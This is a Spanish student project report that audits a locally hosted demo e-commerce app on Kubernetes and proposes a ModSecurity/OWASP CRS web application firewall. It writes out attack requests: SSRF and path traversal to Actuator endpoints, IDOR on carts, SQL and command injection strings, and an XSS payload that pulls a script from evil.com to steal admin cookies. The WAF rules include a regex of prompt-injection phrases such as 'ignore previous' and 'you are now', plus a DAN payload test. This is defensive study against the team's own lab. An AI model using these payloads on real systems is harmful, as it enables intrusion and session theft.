# Análisis de seguridad y diseño del WAF · The Store

> Documento de análisis. Consolida la exploración, la auditoría en vivo, el análisis de impacto y el diseño propuesto en una única referencia navegable. Los documentos originales quedan archivados en [`_archive/`](_archive/).

---

## Índice

1. [Resumen ejecutivo](#1-resumen-ejecutivo)
2. [Contexto y problemática](#2-contexto-y-problem%C3%A1tica)
3. [Estado del arte: WAFs en 2026](#3-estado-del-arte-wafs-en-2026)
4. [Diagnóstico del sistema sin WAF](#4-diagn%C3%B3stico-del-sistema-sin-waf)
5. [Kill chain demostrada en vivo](#5-kill-chain-demostrada-en-vivo)
6. [Análisis de impacto: qué se puede hacer con los PoCs](#6-an%C3%A1lisis-de-impacto-qu%C3%A9-se-puede-hacer-con-los-pocs)
7. [Diseño de la solución](#7-dise%C3%B1o-de-la-soluci%C3%B3n)
8. [Scope del POC y casos de uso](#8-scope-del-poc-y-casos-de-uso)
9. [Alternativas consideradas](#9-alternativas-consideradas)
10. [Plan de validación (testing local y antes/después)](#10-plan-de-validaci%C3%B3n-testing-local-y-antesdespu%C3%A9s)
11. [Anexos](#11-anexos)

---

## 1. Resumen ejecutivo

**Objetivo.** Proteger la aplicación *The Store* (5 microservicios sobre Kubernetes) con un Web Application Firewall.

**Solución elegida.** **ModSecurity v3 + OWASP Core Rule Set** desplegado como módulo del `ingress-nginx` controller del cluster. Una sola pieza, cero cambios en microservicios, cubre todos los puntos de entrada HTTP de la app.

**Justificación cuantitativa.** Auditoría en vivo realizada el 16-abr-2026 contra el cluster local encontró **10 vectores explotables sin autenticación ni herramientas especiales**: SSRF vía `ProxyController`, path traversal que escapa al actuator del UI, IDOR en `/proxy/carts/{customerId}`, Spring Actuator expuesto con 25 KB de métricas por request, cero detección de scanners conocidos, cero rate limit, seis headers de seguridad ausentes. Detalle completo en §4 y §5.

**Alcance del POC.** Siete casos de uso demostrables en vivo con el patrón antes/después, cubriendo las familias OWASP Top 10 A01, A03, A05, A07 y A10. Detalle en §8.

---

## 2. Contexto y problemática

### 2.1 La aplicación a proteger

*The Store* es un e-commerce basado en el *AWS retail-store-sample-app* (charts Helm v1.2.4). Se despliega con `./local.sh create-cluster` sobre un cluster **Kind** (Kubernetes en Docker) single-node.

**Microservicios:**

| Servicio | Stack | Puerto | Service K8s | Rol |
|---|---|---|---|---|
| `ui` | Java 17 · Spring Boot 3 (Webflux) + Spring AI | 8080 | ClusterIP:80 | Frontend HTML + chatbot LLM + proxy interno |
| `catalog` | Go · Gin + Gorm | 8080 | ClusterIP:80 | API de productos |
| `carts` | Java · Spring Boot | 8080 | ClusterIP:80 | Carrito por session-id (in-memory en este deploy) |
| `orders` | Java · Spring Boot | 8080 | ClusterIP:80 | Órdenes (in-memory) |
| `checkout` | Node.js · NestJS (sobre Express) | 8080 | ClusterIP:80 | Orquestación de checkout (in-memory) |

Hardening de pods: `runAsNonRoot: true`, `readOnlyRootFilesystem: true`, drop `ALL` capabilities, `runAsUser: 1000`. Bueno para infra, **irrelevante para ataques de capa de aplicación**.

### 2.2 Topología y direccionamiento

```
Internet / Host :80,:443
        │
        ▼
[ Kind container ] ── extraPortMappings 80/443 → Node :80/:443
        │
        ▼
┌─────────────────────────────────────────────┐
│ Namespace: ingress-nginx                    │
│  Deployment: ingress-nginx-controller        │
│  (Nginx + libmodsecurity v3 disponible)     │
└─────────────────────────────────────────────┘
        │  Ingress rule: Host=localhost Path=/ → ui:80
        ▼
┌─────────────────────────────────────────────┐
│ Namespace: the-store                        │
│                                             │
│  ui:8080 ───► catalog:80                    │
│           ├► carts:80                       │
│           ├► orders:80                      │
│           └► checkout:80                    │
│                                             │
│  (los 4 backends NO tienen Ingress propio)  │
└─────────────────────────────────────────────┘
```

| Bloque | CIDR | Rol |
|---|---|---|
| Pod CIDR | `10.244.0.0/16` | Pods |
| Service CIDR | `10.96.0.0/12` | Services ClusterIP |
| Docker bridge | `172.18.0.0/16` | Red del nodo Kind |
| Host (loopback) | `127.0.0.1/32 :80,:443` | Entrada del usuario |

OS de los nodos: `kindest/node:v1.30.x` basado en Ubuntu 22.04. Protocolo: HTTP/1.1 externo e interno, DNS interno de K8s (`catalog.the-store.svc.cluster.local`).

### 2.3 Por qué un WAF es indispensable

Cinco argumentos, en orden de importancia:

**1. Defense in depth.** El código de The Store *no es malo* — usa Gorm con queries parametrizadas, Thymeleaf con escaping, validación con `@Email`/`@Pattern`. Sin embargo, nuestra auditoría encontró 10 clases de problemas explotables (§4). Es la regla, no la excepción.

**2. Cobertura uniforme con un solo punto de cambio.** En una arquitectura multi-lenguaje (Java/Go/Node), aplicar mitigaciones en código requiere coordinar cinco equipos con cinco frameworks. Un WAF en el ingress aplica **una sola política a todos**.

**3. Velocidad de respuesta.** Ante un zero-day (p. ej. Log4Shell en dic-2021), una regla WAF se despliega en minutos. Un patch en código toma horas o días. El WAF compra tiempo.

**4. Cumplimiento normativo.** PCI-DSS Requirement 6.6 obliga WAF (o code review formal) en sistemas que procesan tarjetas. The Store tiene un endpoint `/checkout` con datos de pago.

**5. Observabilidad y forense.** Los logs de auditoría de ModSecurity registran cliente, endpoint, cuerpo, reglas que matchearon y score acumulado por cada request sospechosa. Sin WAF, esa visibilidad no existe.

---

## 3. Estado del arte: WAFs en 2026

### 3.1 Definición y origen

Un **Web Application Firewall** inspecciona tráfico HTTP/S en capa 7 buscando patrones de ataque o desviaciones del comportamiento esperado. Parsea URLs, headers, cookies, query strings, bodies (form/JSON/multipart), y aplica reglas sobre cada componente. A diferencia de un firewall de capa 4 (solo ve IPs/puertos), entiende semántica de aplicación.

Aparecieron a principios de los 2000 como *virtual patches* — bloquear un SQLi conocido sin esperar a que devs subieran el fix. PCI-DSS los volvió obligatorios en 2008 (Requirement 6.6).

### 3.2 Mercado global (2025-2026)

- **Tamaño:** USD 8,6 mil millones en 2025 → proyección USD 30,9 mil millones en 2034, CAGR ~14,9% ([Fortune Business Insights](https://www.fortunebusinessinsights.com/web-application-firewall-market-108841)).
- **Top vendors (≈ 53% del revenue global):** Cloudflare, Akamai, F5, AWS, Imperva. Complementados por Barracuda, Citrix, Qualys, Fortinet, Microsoft.
- **Regional:** Norteamérica 41,7% del mercado en 2025.

### 3.3 Modelos de despliegue

| Modelo | Ejemplos | Pros | Contras |
|---|---|---|---|
| Network-based / appliance | F5 BIG-IP ASM, Imperva SecureSphere | Latencia baja, throughput alto | Caro, poco elástico |
| **Host-based / embedded** | **ModSecurity en Apache/Nginx**, Shadow Daemon | Bajo costo, granularidad, natural para K8s | Consume recursos del host |
| Cloud-based / managed | Cloudflare, AWS WAF, Akamai Kona, Azure WAF | Sin infra, updates automáticos | Vendor lock-in, costo recurrente |

Para este proyecto el modelo **host-based** es el natural: permite mostrar configuración real, cambiar reglas en vivo, leer logs propios, y todo corre en el mismo cluster.

### 3.4 Lógicas de detección

- **Rule-based / signature-based:** ModSecurity + OWASP CRS, mod_security, NAXSI. Detecta lo conocido; sufre con zero-days y falsos positivos.
- **Modelos positivos (whitelist):** Shadow Daemon. Define qué es aceptable, bloquea todo lo demás. Muy seguro, mantenimiento alto.
- **Machine learning / behavior-based:** Cloudflare, AWS WAF Bot Control. Aprende tráfico legítimo y detecta anomalías. Opaco.
- **Híbridos:** la mayoría de WAFs serios combinan las tres.

### 3.5 OWASP Core Rule Set · deep dive

ModSecurity es el motor; el **OWASP Core Rule Set (CRS)** es el conjunto de reglas open-source de facto, mantenido por OWASP. Tres conceptos centrales:

**Paranoia Levels.**

- **PL1** (default): reglas básicas, FP ~0. Cualquier sitio.
- **PL2:** agrega reglas de bajo FP. Sitios con datos personales.
- **PL3:** estricta, requiere tuning. Finanzas, regulatoria.
- **PL4:** máxima paranoia, prácticamente whitelist.

**Anomaly Scoring.** En lugar de bloquear al primer match, cada regla suma un puntaje según severidad (`CRITICAL=5, ERROR=4, WARNING=3, NOTICE=2`). Si el total supera el threshold (default: 5 inbound, 4 outbound), se bloquea.

**Familias de reglas (estructura `9XX-XXX.conf`):**

| Prefijo | Familia |
|---|---|
| `9xx` | Scanner detection (913) · request integrity (920) |
| `93x` | LFI / path traversal (930) · RCE (932) · PHP injection (933) |
| `94x` | XSS (941) · SQLi (942) · session fixation (943) · Java injection (944) |

Conocer los IDs permite explicar en la demo *qué* regla disparó cada bloqueo.

### 3.6 Limitaciones reales

- Los WAFs **no reemplazan código seguro** — son defense in depth.
- Falsos positivos inevitables a PL altos, requieren tuning continuo.
- **Bypass por encoding** (doble URL-encode, Unicode, JSON con keys raros) es un campo activo de investigación.
- HTTPS debe terminar en el WAF o antes.
- **Ataques lógicos de negocio** (e.g. abusar de un cupón 100 veces) no se detectan con reglas.
- El paper ["The rise and fall of ModSecurity and the OWASP CRS"](https://medium.com/@ariudvd/the-rise-and-fall-of-modsecurity-and-the-owasp-core-rule-set-thanks-respectively-to-robust-and-f7fcd3e6d3e2) discute cómo ataques adversariales con ML están degradando la efectividad de WAFs puramente basados en firmas.

---

## 4. Diagnóstico del sistema sin WAF

Metodología: análisis estático del repo `the-store-main` (commit actual) + auditoría en vivo el 16-abr-2026 desde la consola del navegador contra `http://localhost`. Evidencia completa en [`evidencias/raw-http-transcripts.txt`](evidencias/raw-http-transcripts.txt) y [`evidencias/pocs-data.json`](evidencias/pocs-data.json).

### 4.1 Resumen de hallazgos

| ID | Hallazgo | Severidad | OWASP Top 10 | Confirmado live |
|---|---|---|---|---|
| **H1** | SSRF + path traversal vía `/proxy/**` | **🔴 Crítica** | A03 / A10 | ✅ |
| **H2** | IDOR en `/proxy/carts/{customerId}` (descubierto durante la demo) | **🔴 Crítica** | A01 | ✅ |
| **H3** | Spring Actuator expuesto (info, health, metrics, prometheus) | **🟠 Alta** | A05 | ✅ |
| **H4** | Path traversal escapa al actuator del propio UI | **🔴 Crítica** | A03 / A05 | ✅ |
| **H5** | Sin scanner detection ni rate limiting | 🟠 Alta | A04 | ✅ (167 req/s sin throttling) |
| **H6** | Cabeceras `X-Forwarded-*` aceptadas sin validación | 🟡 Media | A07 | ✅ |
| **H7** | Validación parcial del checkout (solo zipCode + state tienen regex) | 🟡 Media | A03 | ✅ |
| **H8** | Cero headers de seguridad (HSTS, CSP, X-Frame-Options, etc.) | 🟡 Media | A05 | ✅ (0/6) |
| **H9** | Catalog acepta SQLi/RCE en query string sin alarma | 🟡 Media | A03 | ✅ (el backend Gorm parametriza pero nada alerta) |
| **H10** | Header `x-powered-by: Express` en checkout (stack disclosure) | 🟡 Media | A05 | ✅ |

### 4.2 Descripción de los hallazgos principales

#### H1 · SSRF + path traversal vía `ProxyController` (CRÍTICO)

**Archivo:** `src/ui/src/main/java/com/amazon/sample/ui/web/ProxyController.java:38-82`.

El controller reenvía `GET /proxy/{servicio}/**` a `http://<servicio>` con la línea:
```java
String path = proxy.path("/proxy");
return proxy.uri(endpoint + path).header("Content-Type","application/json").forward();
```
El `path` se concatena sin sanitizar → SSRF textbook. La normalización de URI de Java (`ProxyExchange`) colapsa `..` sobre el host root → la request termina apuntando al **propio UI** con el path reescrito.

**Evidencia live:**
```
GET /proxy/catalog/../../actuator/prometheus   →  200 OK · 26.785 bytes
```

#### H2 · IDOR en `/proxy/carts/{customerId}` (CRÍTICO, descubierto durante la demo)

El backend `carts` (ClusterIP, NO debería ser alcanzable desde fuera) responde al proxy con el path segment interpretado como `customerId`:

```
GET /proxy/carts/admin  →  200 {"customerId":"admin","items":[]}
GET /proxy/carts/test   →  200 {"customerId":"test","items":[]}
GET /proxy/carts/1      →  200 {"customerId":"1","items":[]}
```

Lectura: confirmada. Escritura: bloqueada hoy por `405 Method Not Allowed` — el ProxyController solo expone `@GetMapping`. Si en el futuro se agrega `@PostMapping`, el ataque escala a manipulación de carritos ajenos.

#### H3 · Spring Actuator expuesto

Config actual en `src/ui/src/main/resources/application.yml:66-71`:
```yaml
management:
  endpoints:
    web:
      exposure:
        include: info,health,metrics,prometheus
```

| Endpoint | Status | Bytes | Daño |
|---|---|---|---|
| `/actuator/info` | 200 | 2 | Confirma Spring Boot |
| `/actuator/health` | 200 | 49 | Estado de downstreams |
| `/actuator/metrics` | 200 | 1.006 | Lista de 44 métricas |
| `/actuator/prometheus` | 200 | **24.468** | 175 series con JVM, disk, paths llamados por *otros* atacantes, excepciones |
| `/actuator/env` | 404 | — | No incluido · protegido por suerte, no por diseño |
| `/actuator/heapdump` | 404 | — | Idem |

El `actuator/prometheus` filtra en cada hit:
- Capacidad de disco del nodo (1 TB total, 1 TB libre)
- Nombres completos de los 4 microservicios internos (`carts`, `catalog`, `checkout`, `orders`)
- Clase Java principal (`com.amazon.sample.ui.UiApplication`) — base para buscar CVEs
- **Paths llamados recientemente por otros clientes** — canal de OSINT pasivo

#### H5 · Sin scanner detection ni rate limiting

4 User-Agents conocidos (`Nikto`, `sqlmap`, `Nuclei`, `DirBuster`) → **200 OK** sin excepción. 50 requests paralelas a `/` → 597 ms, 167 req/s, distribución `{"200": 50}`.

#### H8 · Cero headers de seguridad

Auditoría: `Strict-Transport-Security` MISSING, `X-Frame-Options` MISSING, `X-Content-Type-Options` MISSING, `Content-Security-Policy` MISSING, `Referrer-Policy` MISSING, `Permissions-Policy` MISSING — **0/6 presentes**.

### 4.3 Veredicto numérico pre-WAF

| Métrica | Estado actual | Esperado post-WAF |
|---|---|---|
| Endpoints sensibles bloqueados | **0/5** | 5/5 |
| Headers de seguridad enviados | **0/6** | 6/6 |
| Scanners bloqueados | **0/4** | 4/4 |
| Rate limit por IP | ∞ | 10 req/s |
| Path traversal explotable | sí | bloqueado (CRS 930xxx) |
| Bytes de métricas filtrados por hit | **25.000** | 0 (403 inmediato) |

---

## 5. Kill chain demostrada en vivo

Narrativa del atacante "Mallory" (browser, sin herramientas, sin credenciales) contra The Store, capturada en vivo el 16-abr-2026.

**Supuesto:** Mallory tiene solo acceso HTTP al puerto 80. Tiempo total hasta exfiltrar las métricas: **< 5 minutos**.

### Fase 1 · Reconocimiento (segundos 0-15)

1. `GET /` → 200, HTML de "Demo Store", 19.973 bytes.
2. `GET /actuator/info` → 200, `{}` → confirma Spring Boot Actuator.
3. Audit headers → 0/6 de seguridad presentes → clickjacking, MIME sniffing, XSS amplificada y downgrade HTTP son viables.

### Fase 2 · Enumeración del Actuator (segundos 15-45)

4. `GET /actuator/health` → estado UP de downstreams.
5. `GET /actuator/metrics` → lista de 44 métricas instrumentadas.

### Fase 3 · Exfiltración masiva (segundos 45-90)

6. `GET /actuator/prometheus` → **25 KB, 175 series**. Mallory parsea y extrae:
   - `disk_total_gb: 1081`, `disk_free_gb: 1002`, `jvm_memory_max_mb: 107`, `uptime_s: 2214`
   - `main_class: "com.amazon.sample.ui.UiApplication"` → base para CVEs
   - `exception_types: ["ApiException"]`
   - `tracked_paths: ["/", "/cart", "/catalog", "/checkout", "/proxy/carts/**", "/proxy/catalog/**", "/proxy/checkout/**", "/proxy/orders/**", "/actuator/health", ...]`
7. **Descubrimiento clave:** los paths `/proxy/<svc>/**` en `tracked_paths` revelan el ProxyController antes de descubrirlo por fuerza bruta.

### Fase 4 · Descubrimiento del proxy (segundos 90-120)

8. `GET /proxy/notreal/foo` → 404 con formato Spring (requestId). Control negativo.
9. `GET /proxy/carts/anything` → **200** `{"customerId":"anything","items":[]}` → triple descubrimiento: proxy activo, backend ClusterIP alcanzable, IDOR confirmado.
10. `GET /proxy/orders/anything` → 404 Spring. `GET /proxy/checkout/anything` → 404 NestJS + header `x-powered-by: Express`. **Stack de cada microservicio identificado sin escaneo.**

### Fase 5 · Path traversal: escape al UI (segundos 120-150)

11. `GET /proxy/catalog/../../actuator/info` → **200** `{}` — la traversal escapa al host del backend y termina en el UI propio.
12. `GET /proxy/catalog/../../actuator/prometheus` → **200 · 25.383 bytes** — el mismo dump, pero por una ruta que bypasea cualquier filtro futuro que se ponga en `/actuator/*` a nivel UI.

### Fase 6 · Defense bypass (segundos 150-180)

13. `X-Forwarded-For: 8.8.8.8` → 200 OK · Spring loggeará esa IP (falsa atribución).
14. UA `Nikto`, `sqlmap`, `Nuclei`, `DirBuster` → 200 OK cada uno.
15. 100 requests en 597 ms → 100/100 con 200 OK. Sin throttling.

### Fase 7 · Escalada hipotética

Hoy `/actuator/env` y `/actuator/heapdump` devuelven 404 porque no están en el `include`. **Es una sola línea de YAML de distancia**. Cuando un dev la agregue por debug:
- `GET /actuator/env` → dump de variables de entorno (incluye `RETAIL_CATALOG_PERSISTENCE_PASSWORD` ya base64-visible en `kubernetes.yaml`).
- `GET /actuator/heapdump` → binario del heap con sesiones, tokens, contraseñas en plain text.

Y vía traversal (`/proxy/catalog/../../actuator/env`), **aunque se bloquee `/actuator/*` directamente**.

### Resumen ejecutivo de la kill chain

| Fase | Duración | Resultado |
|---|---|---|
| 1 · Recon | 15 s | Stack detectado, headers 0/6 |
| 2 · Enum Actuator | 30 s | 4 endpoints abiertos |
| 3 · Exfiltración | 45 s | **25 KB** dumpeados, mapa de microservicios |
| 4 · Proxy SSRF | 30 s | 4 backends alcanzables · **IDOR confirmado** |
| 5 · Path traversal | 30 s | Actuator del UI alcanzable vía `/proxy/<svc>/../..` |
| 6 · Defense bypass | 30 s | Scanner UAs y rate-limit en cero |
| **Total** | **3 min** | **10/10 vectores explotables** |

---

## 6. Análisis de impacto: qué se puede hacer con los PoCs

Las vulnerabilidades aisladas son interesantes; lo que mata es la cadena. Tres horizontes de daño.

### 6.1 Lo que un atacante puede hacer HOY

| PoC | Impacto inmediato |
|---|---|
| **H3** Prometheus | Mapa completo de infra, canal pasivo de OSINT sobre qué otros atacantes están probando. |
| **H2** IDOR carts | Enumeración de carritos de cualquier cliente → privacy breach, competitive intelligence. |
| **H1/H4** SSRF + traversal | Bypass de futuros filtros que apliquen solo sobre el path directo. |
| **H5** Sin scanner detection | sqlmap/nikto/nuclei corren sin ser notados. |
| **H5** Sin rate limit | 167 req/s sostenidas → DoS aplicacional con <10 atacantes coordinados. |
| **H9** SQLi silencioso | Atacante itera 10.000 payloads sin alarma. |
| **H6** X-Forwarded spoofing | Falsa atribución, bypass de IP banning futuro. |
| **H8** Sin headers | Clickjacking, MIME confusion, XSS amplificada sin CSP. |

### 6.2 Lo que se puede hacer MAÑANA (con un cambio "inocente")

| Cambio menor en la app | Impacto combinado con PoCs actuales |
|---|---|
| `include: env` al actuator | `GET /actuator/env` filtra `RETAIL_CATALOG_PERSISTENCE_PASSWORD` → DB comprometida |
| `include: heapdump` | `GET /actuator/heapdump` → binario con sesiones, tokens, passwords |
| `@PostMapping` al ProxyController | IDOR de lectura se vuelve escritura → manipulación de carritos ajenos |
| Activar chat LLM | Prompt injection + DoS por costo de LLM |
| Migración a MySQL | Los payloads SQLi dejan de ser teóricos |
| `os/exec` con query params | PoC de RCE deja de ser teórico |
| Dashboard de admin sin sanitización | XSS persistido ejecuta en sesión de admin → takeover |

### 6.3 Kill chains combinadas típicas

**Cadena A · Information Disclosure → Full Recon · 5 min · skill bajo · visibilidad cero**
1. `GET /actuator/prometheus` → mapa de microservicios y paths.
2. `GET /proxy/{carts,orders,checkout}/*` → identifica stack de cada backend.
3. `GET /proxy/carts/{admin,test,1,...}` → dumpea carritos.
4. `GET /` con UA `sqlmap` → escaneo completo sin alertas.

**Cadena B · Proxy Pivot → Credenciales** (espera a cambio de config)
1. SSRF + traversal ya montado (PoCs H1, H4).
2. Algún dev agrega `env` al include.
3. `GET /proxy/catalog/../../actuator/env` → dump de env vars → DB password.
4. Conexión directa a DB → exfiltración total del catálogo.

**Cadena C · XSS persistido → Takeover**
1. `POST /checkout` con `firstName=<script src=evil.com/x.js>` (PoC H7).
2. Admin abre la orden en el dashboard.
3. `x.js` hace `document.cookie + fetch('/api/admin/users')` → roba sesión admin.
4. Precios, refunds, base de clientes → comprometidos.

### 6.4 Análogos en breaches reales (últimos 5 años)

| Breach real | Año | Vector | Conexión con nuestros PoCs |
|---|---|---|---|
| **Capital One** (100M) | 2019 | SSRF a metadata service | H1/H4 estructuralmente idéntico |
| **Log4Shell** | 2021 | Payload en HTTP header | H5 muestra que headers pasan sin filtro |
| **Spring4Shell** | 2022 | RCE en Spring data binding | Versión exacta revelada por H3 |
| **Optus** (10M) | 2022 | API con IDs secuenciales sin auth | **H2 es idénticamente eso** |
| **23andMe** (6.9M) | 2023 | Credential stuffing sin rate limit | **H5** |
| **MOVEit Transfer** (~2.500 orgs) | 2023 | SQLi silenciosa | H9 estructuralmente igual |

### 6.5 Daño en moneda real (e-commerce hipotético $10M GMV/año)

- **Multas** (PCI-DSS, GDPR/Ley 25.326 Argentina): USD 5K–20M
- **Privacy breach** por IDOR H2: USD 20M o 4% revenue (GDPR/LOPD)
- **Scraping/bot abuse** sin rate limit: USD 50K–500K/año
- **Fraude por XSS + takeover admin** (Cadena C): USD 100K–1M
- **Ransom de DB** via Cadena B: USD 500K–5M
- **Incident response + PR crisis**: USD 200K–1M

**Total potencial anualizado: USD 1M – 10M evitables.**

**Costo del WAF:** $0 licencia + 0,1 vCPU + 64 MB RAM + ~3 días-persona de setup. **ROI entre 100:1 y 1.000.000:1.**

---

## 7. Diseño de la solución

### 7.1 Decisión arquitectural

ModSecurity v3 se incrusta como módulo dinámico del `ingress-nginx-controller`, en el namespace `ingress-nginx`. La imagen oficial `registry.k8s.io/ingress-nginx/controller` ya trae `libmodsecurity` y `ModSecurity-nginx` compilados — alcanza con activarlos por `ConfigMap`.

**Cero cambios en microservicios, cero cambios en el namespace `the-store`.**

### 7.2 Diagrama "as built" propuesto

```
Internet :80
   │
   ▼
┌──────────────────────────────────────────┐
│ ingress-nginx (Pod)                      │
│ ┌──────────────────────────────────┐    │
│ │ Nginx + libmodsecurity v3        │───► modsec_audit.log
│ │ + OWASP CRS @ PL2 (anomaly mode) │
│ │ + reglas custom (Actuator, chat, │
│ │   proxy guardrails, headers)     │
│ └──────────┬───────────────────────┘
└────────────┼──────────────────────────────┘
             │ (solo requests legítimas)
             ▼
       Ingress rule → ui Service
             │
             ▼
      ┌──────────────┐
      │ ui (Spring)  │──► catalog / carts / orders / checkout
      └──────────────┘    (sin cambios)
```

### 7.3 Configuración planeada (esquema)

```yaml
apiVersion: v1
kind: ConfigMap
metadata:
  name: ingress-nginx-controller
  namespace: ingress-nginx
data:
  enable-modsecurity: "true"
  enable-owasp-modsecurity-crs: "true"
  modsecurity-snippet: |
    SecRuleEngine On
    SecAuditEngine RelevantOnly
    SecAuditLog /var/log/modsec_audit.log
    SecRequestBodyAccess On
    Include /etc/nginx/owasp-modsecurity-crs/crs-setup.conf
    Include /etc/nginx/owasp-modsecurity-crs/rules/*.conf

    # Reglas custom (anti-actuator, anti-proxy-abuse, anti-scanner, anti-prompt-injection)
    SecRule REQUEST_URI "@rx ^/actuator/(env|heapdump|threaddump|loggers|configprops|metrics|prometheus|info|caches|conditions)" \
      "id:9001,phase:1,deny,status:403,log,msg:'Blocked sensitive Actuator endpoint'"

    SecRule REQUEST_URI "@rx ^/proxy/.*\.\." \
      "id:9003,phase:1,deny,status:403,log,msg:'Blocked proxy path traversal'"

    SecRule REQUEST_URI "@beginsWith /chat/submit" \
      "id:9002,phase:2,chain,deny,status:403,log,msg:'Possible prompt injection'"
      SecRule REQUEST_BODY "@rx (?i)(ignore (all )?previous|system prompt|you are now|jailbreak|DAN mode)"

    SecRule REQUEST_HEADERS:X-Forwarded-For "@rx .+" \
      "id:9004,phase:1,nolog,pass,setvar:'request_headers.X-Forwarded-For=%{REMOTE_ADDR}'"
```

Y en el Ingress principal, anotaciones para rate limiting y security headers:

```yaml
annotations:
  nginx.ingress.kubernetes.io/limit-rps: "10"
  nginx.ingress.kubernetes.io/limit-connections: "5"
  nginx.ingress.kubernetes.io/configuration-snippet: |
    more_set_headers "Strict-Transport-Security: max-age=31536000; includeSubDomains";
    more_set_headers "X-Frame-Options: DENY";
    more_set_headers "X-Content-Type-Options: nosniff";
    more_set_headers "Content-Security-Policy: default-src 'self'";
    more_set_headers "Referrer-Policy: strict-origin-when-cross-origin";
    more_set_headers "Permissions-Policy: geolocation=(), camera=()";
```

### 7.4 Modos de operación a demostrar

| Modo | Config | Rol en la demo |
|---|---|---|
| `DetectionOnly` | `SecRuleEngine DetectionOnly` | Loggea pero no bloquea. Sirve para tuning inicial y para mostrar "mirá, sin WAF esto pasa". |
| `On` (blocking) | `SecRuleEngine On` | Devuelve `403` ante el ataque. Estado final. |
| Offender tracking | reglas `905xxx` | Trackea IPs reincidentes con bloqueo temporal. Punto bonus. |

---

## 8. Scope del POC y casos de uso

Siete escenarios listos para mostrar en vivo con el patrón antes/después. Cada uno tiene tres tomas: (a) ataque sin WAF (200 OK), (b) WAF en `DetectionOnly` (pasa pero queda en log), (c) WAF en `On` (bloqueado con 403).

| # | Ataque | Endpoint | Familia CRS | Tiempo demo |
|---|---|---|---|---|
| 1 | SQL injection | `GET /catalog?tag=' OR 1=1--` | 942xxx | 90 s |
| 2 | XSS reflejado | `POST /checkout` (firstName) | 941xxx | 90 s |
| 3 | Path traversal / SSRF | `GET /proxy/carts/../../actuator/heapdump` | 930xxx + custom | 120 s |
| 4 | Command injection | `GET /catalog?tag=;cat /etc/passwd` | 932xxx | 60 s |
| 5 | Spring Actuator abuse | `GET /actuator/env` | custom 9001 | 60 s |
| 6 | Prompt injection al chat | `POST /chat/submit` con payload DAN | custom 9002 | 90 s |
| 7 | Scanner detection | `curl -A Nikto/2.5` | 913xxx | 60 s |

**Tiempo total: ~10 min de demo**, dejando 20 min para narrativa + Q&A en el slot de 30 min del 9/6.

**Bonus:** mostrar un falso positivo intencional (búsqueda de un libro titulado "O'Brien' OR 1=1") y resolverlo con `SecRuleRemoveById 942100` sobre esa URL. Demuestra dominio de la herramienta y no solo uso de receta.

### Mapa "ataque → regla WAF que lo mitiga"

| Ataque demostrado | Mitigación post-WAF |
|---|---|
| Stack detection via `/actuator/info` | Custom `id:9001` |
| Headers de seguridad ausentes | `more_set_headers` en Ingress |
| Exfiltración de Prometheus | Custom `id:9001` |
| Pivote a backends ClusterIP | Custom `id:9003` + guardrails en `/proxy/.*/(actuator\|admin\|debug)` |
| IDOR en `/proxy/carts/{id}` | Custom rule: deny `^/proxy/carts/` sin `Authorization` |
| Path traversal en proxy | OWASP CRS 930xxx |
| Spoofing X-Forwarded-* | Custom `id:9004` |
| UA Nikto/sqlmap/Nuclei | OWASP CRS 913xxx |
| Sin rate limit | Annotation `limit-rps: "10"` |

---

## 9. Alternativas consideradas

| Alternativa | Descartada porque… |
|---|---|
| **Shadow Daemon** | Requiere instrumentar PHP/Python/Perl. La UI es Java y los servicios son Go/Java/Node — el conector no aplica naturalmente. |
| **OpenWAF** | Sin commits desde 2018, documentación parcialmente en chino, comunidad inexistente. Riesgo alto de mantenimiento. |
| **Coraza (OWASP)** | Sucesor moderno de ModSec, escrito en Go, compatible con CRS. Excelente técnicamente pero **no figura en el enunciado** → requiere aprobación previa. Se nombra como "evolución futura". |
| **NAXSI** | WAF positivo (whitelist) para Nginx. Contraste teórico interesante pero curva de tuning empinada, no encaja en el alcance. |
| **WAF cloud (Cloudflare / AWS WAF)** | Costo y/o cuenta del proveedor. El despliegue es local. |

---

## 10. Plan de validación (testing local y antes/después)

> Respuesta a la duda "¿Cómo probamos esto siendo que la app corre localmente?"

### 10.1 Por qué el local alcanza

**El WAF no se entera si el cliente es local o remoto**, solo inspecciona HTTP/S. Los payloads son idénticos. Para simular ataques desde distintas IPs se usa `X-Forwarded-For: 203.0.113.42` (rango TEST-NET-3) y distintas User-Agents.

### 10.2 Estrategia de testing en 6 pasos

1. **Baseline pre-WAF** — ya ejecutado, ver [`evidencias/pocs-data.json`](evidencias/pocs-data.json). 10/10 PoCs explotables.
2. **Deploy del WAF** — un `kubectl apply` con el ConfigMap del §7.3 + anotaciones al Ingress.
3. **Baseline post-WAF** — abrir [`demo/exploit-dashboard.html`](demo/exploit-dashboard.html), click *Run All Exploits*, exportar JSON.
4. **Diff** — script que compara `pocs-data.json` (pre) vs el nuevo (post) y reporta `pre: 10 vuln / post: 0 vuln`.
5. **Logs de ModSecurity** — 1 screenshot por cada regla que disparó (evidence de que el WAF bloqueó, no simplemente timeout).
6. **Test de falsos positivos** — queries legítimas (`?tag=shoes`, `firstName=O'Brien`) deben seguir devolviendo 200. Si no, se tunea con `SecRuleRemoveById`.

### 10.3 Redundancia y failover

- **Cada uno de los 3 integrantes** levanta el cluster en su laptop con `./local.sh create-cluster --skip-tests` (< 3 min). Redundancia total, $0.
- **Script de validación automatizado** (opcional, queda como evidencia en el repo): un workflow de GitHub Actions que levanta Kind, aplica el WAF, corre los 16 PoCs, exige 0/16 vulnerables.
- **Cloudflare Tunnel** (opcional): `cloudflared tunnel --url http://localhost` expone el cluster con URL HTTPS temporal durante los 30 min de la demo. Se cierra al terminar.

### 10.4 Entregables de validación

- `evidencias/pocs-data.json` — baseline pre-WAF ✅ (ya existe).
- `evidencias/pocs-data-post-waf.json` — snapshot post-deploy (a generar cuando desplegamos).
- `evidencias/modsec-audit-samples/` — logs de ModSec por PoC.
- `demo/validation-diff-report.html` — render visual del diff pre/post (a generar).

---

## 11. Anexos

### Anexo A · Estructura del repo

```
WAF-redes-ITBA/
├── README.md                          ← ESTE DOCUMENTO (master)
├── Enunciado TPE.pdf                  ← enunciado del proyecto
├── the-store-main/                    ← código de la app (no modificar)
├── demo/
│   ├── exploit-dashboard.html         ← dashboard interactivo, 18 exploits en botones
│   └── evidence-pack.html             ← forensic report estilo screenshot, self-contained
├── evidencias/
│   ├── raw-http-transcripts.txt       ← request/response raw de cada PoC
│   ├── pocs-data.json                 ← mismos datos estructurados para diff
│   └── README.md                      ← dónde buscar capturas de Chrome
├── tests/
│   └── 01-pre-waf-attacks.sh          ← 16 PoCs en bash para correr desde terminal
└── _archive/                          ← MDs originales (01/02/03/04)
